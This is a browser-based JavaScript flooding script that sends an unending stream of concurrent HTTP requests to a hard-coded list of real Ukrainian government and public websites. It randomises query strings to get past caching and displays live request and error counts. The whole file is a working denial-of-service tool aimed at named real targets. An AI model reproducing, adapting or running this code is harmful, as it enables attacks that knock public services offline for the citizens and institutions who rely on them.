    var targets = {
        'https://diia.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        // 'https://www.ubr.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://cis.org.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://www.mns.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://dpsu.gov.ua/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://www.apn-ua.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'https://ukraine.ua/': { number_of_requests: 0, number_of_errored_responses: 0 }
    }
  
    var statsEl = document.getElementById('stats');

function printStats() {
    statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
}
setInterval(printStats, 1);

var CONCURRENCY_LIMIT = 500;
var queue = [];

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0;; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 2800))
        queue.push(
            fetchWithTimeout(target + rand, {
                timeout: 5000
            })
            .catch((error) => {
                if (error.code === 20 /* ABORT */ ) {
                    return;
                }
                targets[target].number_of_errored_responses++;
                targets[target].error_message = error.message
            })
            .then((response) => {
                if (response && !response.ok) {
                    targets[target].number_of_errored_responses++;
                    targets[target].error_message = response.statusText
                }
                targets[target].number_of_requests++;
            })

        )
    }
}
  
  // Start
  Object.keys(targets).map(flood)
